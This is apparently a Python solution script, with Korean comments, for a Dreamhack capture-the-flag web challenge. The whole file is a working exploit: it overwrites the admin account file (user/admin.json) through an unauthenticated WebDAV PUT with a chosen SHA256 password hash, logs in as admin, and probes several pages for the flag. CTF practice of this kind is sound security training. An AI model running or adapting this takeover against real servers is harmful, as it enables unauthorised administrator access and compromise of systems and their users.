import requests
import hashlib
import json

# ================= 설정 =================
TARGET_URL = "http://host3.dreamhack.games:24019"
USERNAME = "admin"
NEW_PASSWORD = "my_hack_password"
# 패스워드를 SHA256으로 해싱 (login.php의 로직과 동일하게)
NEW_PASSWORD_HASH = hashlib.sha256(NEW_PASSWORD.encode()).hexdigest()

# 덮어쓸 admin.json의 내용
PAYLOAD = {
    "id": USERNAME,
    "password": NEW_PASSWORD_HASH
}
# ========================================

session = requests.Session()

print("=========================================")
print("[*] 익스플로잇 시작")
print(f"[*] 타겟 URL: {TARGET_URL}")
print(f"[*] 타겟 계정: {USERNAME}")
print(f"[*] 설정할 패스워드: {NEW_PASSWORD}")
print(f"[*] 설정할 패스워드 해시: {NEW_PASSWORD_HASH}")
print(f"[*] 전송할 JSON 페이로드: {json.dumps(PAYLOAD)}")
print("=========================================\n")

# 1단계: WebDAV PUT 메서드를 이용해 admin.json 덮어쓰기
put_url = f"{TARGET_URL}/user/{USERNAME}.json"
print(f"[!] 1단계: PUT 요청으로 {put_url} 덮어쓰기 시도 중...")
try:
    # json 파라미터를 사용하면 자동으로 Content-Type: application/json이 붙습니다.
    res_put = session.put(put_url, json=PAYLOAD)
    print(f"  [-] PUT 요청 상태 코드: {res_put.status_code}")
    print(f"  [-] PUT 요청 응답 헤더: {res_put.headers}")
    print(f"  [-] PUT 요청 응답 본문: {res_put.text[:200]}")
    
    if res_put.status_code in [200, 201, 204]:
        print("  [+] admin.json 덮어쓰기 성공 예상!\n")
    else:
        print("  [-] admin.json 덮어쓰기 실패 가능성 있음. (일단 다음 단계 진행)\n")
except Exception as e:
    print(f"  [X] PUT 요청 중 치명적 에러 발생: {e}\n")

# 2단계: 덮어쓴 비밀번호로 로그인 시도
login_url = f"{TARGET_URL}/login.php"
login_data = {
    "username": USERNAME,
    "password": NEW_PASSWORD
}
print(f"[!] 2단계: POST 요청으로 {login_url} 로그인 시도 중...")
print(f"  [-] 전송 폼 데이터: {login_data}")
try:
    res_login = session.post(login_url, data=login_data)
    print(f"  [-] 로그인 요청 상태 코드: {res_login.status_code}")
    print(f"  [-] 로그인 응답 헤더: {res_login.headers}")
    print(f"  [-] 획득한 세션 쿠키 값: {session.cookies.get_dict()}")
    
    if "Hello admin" in res_login.text or "alert" in res_login.text:
        print(f"  [-] 응답 본문 힌트: {res_login.text.strip()}")
        print("  [+] 로그인 요청 전송 완료 (응답 결과 확인 요망)\n")
    else:
        print("  [-] 로그인 실패 가능성 있음.\n")
except Exception as e:
    print(f"  [X] 로그인 요청 중 에러 발생: {e}\n")

# 3단계: 플래그 획득 시도
# source 7번의 파일명을 아직 모르므로, 예상되는 경로들을 순회합니다.
expected_flag_urls = [
    f"{TARGET_URL}/flag.php", 
    f"{TARGET_URL}/admin.php", 
    f"{TARGET_URL}/"
]

print(f"[!] 3단계: 플래그 페이지 접근 시도 중...")
for url in expected_flag_urls:
    print(f"  [-] GET 요청: {url}")
    try:
        res_flag = session.get(url)
        print(f"  [-] 응답 상태 코드: {res_flag.status_code}")
        
        if "DH{" in res_flag.text:
            print(f"\n  [🎉] 플래그 발견!!! URL: {url}")
            print(f"  [🎉] 플래그 내용: {res_flag.text.strip()}")
            break
        else:
            print(f"  [-] 플래그 없음. (응답 본문 길이: {len(res_flag.text)} bytes)")
    except Exception as e:
        print(f"  [X] GET 요청 중 에러 발생: {e}")